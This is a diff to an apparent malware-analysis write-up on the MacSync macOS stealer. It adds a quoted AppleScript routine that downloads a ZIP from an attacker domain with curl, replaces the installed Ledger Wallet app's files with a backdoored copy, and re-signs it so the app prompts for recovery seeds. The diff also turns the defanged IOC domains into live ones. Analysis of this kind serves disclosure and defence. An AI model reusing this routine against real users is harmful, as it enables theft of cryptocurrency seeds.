@@ -934,6 +934,58 @@ A likely fake error message is then returned, despite the recovery seeds being s
 
 ## Ledger Backdoor
 
+MacSync malware can target the victim’s Ledger application, if installed, by extracting a malicious App.asar and Info.plist from a ZIP archive and replacing the legitimate files.
+
+```
+set LEDGERURL to "hxxps[://]ballfrank[.]today/ledger/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
+set LEDGERMOUNT to "/tmp"
+set LEDGERPATH0 to LEDGERMOUNT & "/app.asar"
+set LEDGERPATH1 to LEDGERMOUNT & "/Info.plist"
+set LEDGERDMGPATH to LEDGERMOUNT & "/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514.zip"
+set LEDGERNAME to "Ledger Wallet.app"
+set LEDGERAPPFOLDER to "/Applications"
+set LEDGERDEST to LEDGERAPPFOLDER & "/" & LEDGERNAME
+set LEDGERTMPDEST to "/tmp/Ledger Wallet.app"
+set LEDGERDESTFILE0 to LEDGERDEST & "/Contents/Resources/app.asar"
+set LEDGERDESTFILE1 to LEDGERDEST & "/Contents/Info.plist"
+
+try
+    do shell script "test -d " & quoted form of LEDGERDEST
+    set ledger_installed to true
+on error
+    set ledger_installed to false
+end try
+
+if ledger_installed then
+    try
+        do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of LEDGERURL & " -o " & quoted form of LEDGERDMGPATH
+        do shell script "unzip -q -o " & quoted form of LEDGERDMGPATH & " -d " & quoted form of LEDGERMOUNT
+        set app_exists to false
+		try
+            do shell script "test -e " & quoted form of LEDGERPATH0
+            set app_exists to true
+		on error
+			set app_exists to false
+        end try
+		try
+            do shell script "test -e " & quoted form of LEDGERPATH1
+            set app_exists to true
+		on error
+			set app_exists to false
+        end try
+		if app_exists then
+			do shell script "cp -rf " & quoted form of LEDGERDEST & " " & quoted form of LEDGERTMPDEST
+			do shell script "rm -rf " & quoted form of LEDGERDEST
+			do shell script "mv " & quoted form of LEDGERTMPDEST & " " & quoted form of LEDGERDEST
+            do shell script "mv " & quoted form of LEDGERPATH0 & " " & quoted form of LEDGERDESTFILE0
+            do shell script "mv " & quoted form of LEDGERPATH1 & " " & quoted form of LEDGERDESTFILE1
+			do shell script "codesign -f -d -s - " & quoted form of LEDGERDEST
+        end if
+    end try
+
+end if
+```
+
 Upon execution of the backdoored Ledger application, it tells you there was a problem and you need to enter your recovery seed from the hardware wallet.
 
 <img width="1026" height="775" alt="image" src="https://github.com/user-attachments/assets/683114d9-f2b3-4faf-8699-f6f84af5952f" />
@@ -995,8 +1047,8 @@ continueBtn.addEventListener('click', function () {
 ```
 
 ## IOCs
-- ballfrank[.]today
+- ballfrank.today
 
-- macfilearchive[.]com
+- macfilearchive.com
 
-- ledger-gate[.]coupons
+- ledger-gate.coupons
